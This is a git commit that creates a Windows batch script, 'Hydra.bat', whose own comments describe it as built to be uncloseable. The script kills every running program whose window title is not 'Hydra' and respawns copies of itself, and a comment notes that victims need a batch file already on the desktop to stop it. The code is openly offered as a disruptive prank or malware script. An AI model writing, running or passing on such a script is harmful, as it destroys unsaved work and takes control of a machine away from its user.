88d27c2f3f55b1720eb5e89c3cb48af0eb6242c6
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 11:42:51 -0500

    Create Hydra.bat

---
+++ Hydra.bat
@@ -0,0 +1,12 @@
+@ECHO OFF
+SET n=1
+title Hydra.bat
+::Lets make this uncloseable by all other programs. 
+FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
+SET windowcount=%%F
+)
+TASKKILL /FI "WINDOWTITLE ne Hydra" ::Closes everything except for itself. They have to have a batch file already on their desktop to stop this one.
+IF "%windowcount%"=="%n%" (
+START Hydra.bat
+set /a n+=1
+)
